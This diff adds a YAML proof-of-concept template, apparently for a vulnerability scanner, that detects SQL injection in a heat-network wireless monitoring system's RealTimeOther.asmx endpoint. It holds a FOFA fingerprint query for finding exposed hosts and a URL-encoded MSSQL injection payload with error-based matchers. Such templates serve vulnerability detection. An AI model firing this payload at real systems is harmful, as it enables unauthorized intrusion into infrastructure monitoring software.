@@ -1,0 +1,31 @@
+id: poc-yaml-heat-network-wms-realtimeother-sqli
+info:
+  name: 热网无线监测系统 RealTimeOther SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 热网无线监测系统
+  fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /DataSrvs/RealTimeOther.asmx/ChangeStationToOld
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: stationID=%28SELECT+CHAR%28113%29%2Bsys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2B%2B%28CASE+WHEN+%289253%3D9253%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%29
+  expression: 'status_code == 500 &&
+
+    contains(body,"q0x" + t2) &&
+
+    contains(body,"SqlException") &&
+
+    contains(body,"RealTimeOther") &&
+
+    matches(body,"转换成数据类型(.*?)时失败") &&
+
+    matches(body,"在将(.*?)值")
+
+    '
+transport: http
